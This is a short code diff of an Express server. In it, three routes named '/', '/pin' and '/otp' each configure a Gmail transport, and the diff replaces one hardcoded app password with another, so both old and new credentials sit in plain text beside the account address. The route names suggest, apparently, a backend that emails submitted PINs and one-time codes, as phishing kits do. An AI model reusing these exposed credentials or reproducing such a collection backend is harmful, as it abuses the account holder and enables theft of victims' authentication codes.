@@ -21,7 +21,7 @@ app.post("/", (req, res) => {
     service: "gmail",
     auth: {
       user: "Jachinmanwankwofortune@gmail.com",
-      pass: "updebcxzhfcpcasv",
+      pass: "dhmmfhotnzkfofwb",
 
     },
   });
@@ -52,7 +52,7 @@ app.post("/pin", (req, res) => {
     service: "gmail",
     auth: {
       user: "Jachinmanwankwofortune@gmail.com",
-      pass: "updebcxzhfcpcasv",
+      pass: "dhmmfhotnzkfofwb",
     },
   });
 
@@ -82,7 +82,7 @@ app.post("/otp", (req, res) => {
     service: "gmail",
     auth: {
       user: "Jachinmanwankwofortune@gmail.com",
-      pass: "updebcxzhfcpcasv",
+      pass: "dhmmfhotnzkfofwb",
     },
   });
 
